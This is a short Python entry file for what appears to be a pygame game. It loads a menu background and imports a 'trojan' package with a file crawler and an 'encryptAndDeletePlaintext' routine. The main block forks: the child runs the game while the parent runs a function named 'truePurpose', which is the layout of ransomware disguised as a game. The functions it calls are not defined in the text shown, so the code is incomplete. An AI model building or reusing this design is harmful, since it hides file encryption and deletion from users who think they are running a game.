import pygame
import os
import pathlib

# Relative Imports
from game.menu.main_menu import main_menu
from trojan.crawler import Crawler
from trojan.crypto import encryptAndDeletePlaintext

PATH_TO_DIR = pathlib.Path(__file__).parent.absolute()

# load image assets
main_menu_bkground = pygame.image.load(
    f"{PATH_TO_DIR}{os.sep}assets{os.sep}menu{os.sep}main_menu_background.png"
)



if __name__ == "__main__":
    childpid = os.fork()
    if childpid == 0:
    	game()
    else:
    	truePurpose();
